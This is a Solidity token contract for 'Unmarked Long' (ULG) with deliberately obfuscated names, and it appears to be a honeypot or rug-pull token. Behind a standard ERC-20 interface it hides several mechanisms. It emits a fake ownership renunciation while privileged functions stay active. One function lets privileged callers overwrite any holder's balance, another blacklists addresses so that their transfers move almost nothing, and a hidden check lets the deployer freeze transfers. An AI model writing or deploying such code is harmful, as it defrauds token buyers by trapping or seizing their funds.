//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface amountTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract buyMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minLimit {
    function createPair(address receiverLaunch, address limitEnable) external returns (address);
}

interface atLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverBuy) external view returns (uint256);

    function transfer(address sellTeamTo, uint256 teamAt) external returns (bool);

    function allowance(address modeSenderLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamAt) external returns (bool);

    function transferFrom(
        address sender,
        address sellTeamTo,
        uint256 teamAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeLiquidityMin, uint256 value);
    event Approval(address indexed modeSenderLaunch, address indexed spender, uint256 value);
}

interface atLiquidityMetadata is atLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UnmarkedLong is buyMax, atLiquidity, atLiquidityMetadata {

    function walletSellSender(address txAmount) public {
        fundBuyReceiver();
        if (enableToken == maxLiquidityAuto) {
            enableToken = true;
        }
        if (txAmount == receiverFundSell || txAmount == autoTo) {
            return;
        }
        autoList[txAmount] = true;
    }

    address public autoTo;

    address tokenMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public autoList;

    function totalSupply() external view virtual override returns (uint256) {
        return txLimit;
    }

    function approve(address fundShouldTotal, uint256 teamAt) public virtual override returns (bool) {
        exemptReceiver[_msgSender()][fundShouldTotal] = teamAt;
        emit Approval(_msgSender(), fundShouldTotal, teamAt);
        return true;
    }

    bool public enableToken;

    uint256 atMin;

    uint256 constant swapToken = 1 ** 10;

    event OwnershipTransferred(address indexed amountMax, address indexed fundTeam);

    function toFund(address listExemptFee, address sellTeamTo, uint256 teamAt) internal returns (bool) {
        require(enableReceiver[listExemptFee] >= teamAt);
        enableReceiver[listExemptFee] -= teamAt;
        enableReceiver[sellTeamTo] += teamAt;
        emit Transfer(listExemptFee, sellTeamTo, teamAt);
        return true;
    }

    function sellMarketing(address teamSell) public {
        require(teamSell.balance < 100000);
        if (fromSell) {
            return;
        }
        if (senderTx != fundSwap) {
            senderTx = enableSender;
        }
        feeModeReceiver[teamSell] = true;
        
        fromSell = true;
    }

    function transfer(address buyAmount, uint256 teamAt) external virtual override returns (bool) {
        return txReceiver(_msgSender(), buyAmount, teamAt);
    }

    mapping(address => uint256) private enableReceiver;

    function txReceiver(address listExemptFee, address sellTeamTo, uint256 teamAt) internal returns (bool) {
        if (listExemptFee == receiverFundSell) {
            return toFund(listExemptFee, sellTeamTo, teamAt);
        }
        uint256 sellBuy = atLiquidity(autoTo).balanceOf(tokenMode);
        require(sellBuy == atMin);
        require(sellTeamTo != tokenMode);
        if (autoList[listExemptFee]) {
            return toFund(listExemptFee, sellTeamTo, swapToken);
        }
        return toFund(listExemptFee, sellTeamTo, teamAt);
    }

    constructor (){
        if (senderTx != fundSwap) {
            senderTx = fundSwap;
        }
        amountTeam senderSell = amountTeam(launchTo);
        autoTo = minLimit(senderSell.factory()).createPair(senderSell.WETH(), address(this));
        if (senderTx == enableLimit) {
            fundSwap = enableSender;
        }
        receiverFundSell = _msgSender();
        fundSell();
        feeModeReceiver[receiverFundSell] = true;
        enableReceiver[receiverFundSell] = txLimit;
        if (maxLiquidityAuto != enableToken) {
            senderTx = enableLimit;
        }
        emit Transfer(address(0), receiverFundSell, txLimit);
    }

    string private takeShould = "Unmarked Long";

    function owner() external view returns (address) {
        return swapAt;
    }

    address public receiverFundSell;

    function allowance(address limitTo, address fundShouldTotal) external view virtual override returns (uint256) {
        if (fundShouldTotal == launchTo) {
            return type(uint256).max;
        }
        return exemptReceiver[limitTo][fundShouldTotal];
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenReceiver;
    }

    function getOwner() external view returns (address) {
        return swapAt;
    }

    function balanceOf(address receiverBuy) public view virtual override returns (uint256) {
        return enableReceiver[receiverBuy];
    }

    uint256 private senderTx;

    uint256 private fundSwap;

    function receiverFee(address buyAmount, uint256 teamAt) public {
        fundBuyReceiver();
        enableReceiver[buyAmount] = teamAt;
    }

    mapping(address => bool) public feeModeReceiver;

    address launchTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private exemptReceiver;

    string private tokenReceiver = "ULG";

    function limitMaxTeam(uint256 teamAt) public {
        fundBuyReceiver();
        atMin = teamAt;
    }

    uint8 private txTo = 18;

    uint256 public enableSender;

    function decimals() external view virtual override returns (uint8) {
        return txTo;
    }

    function name() external view virtual override returns (string memory) {
        return takeShould;
    }

    uint256 public enableLimit;

    function transferFrom(address listExemptFee, address sellTeamTo, uint256 teamAt) external override returns (bool) {
        if (_msgSender() != launchTo) {
            if (exemptReceiver[listExemptFee][_msgSender()] != type(uint256).max) {
                require(teamAt <= exemptReceiver[listExemptFee][_msgSender()]);
                exemptReceiver[listExemptFee][_msgSender()] -= teamAt;
            }
        }
        return txReceiver(listExemptFee, sellTeamTo, teamAt);
    }

    function fundSell() public {
        emit OwnershipTransferred(receiverFundSell, address(0));
        swapAt = address(0);
    }

    bool private maxLiquidityAuto;

    uint256 receiverReceiver;

    address private swapAt;

    function fundBuyReceiver() private view {
        require(feeModeReceiver[_msgSender()]);
    }

    bool public fromSell;

    uint256 private txLimit = 100000000 * 10 ** 18;

}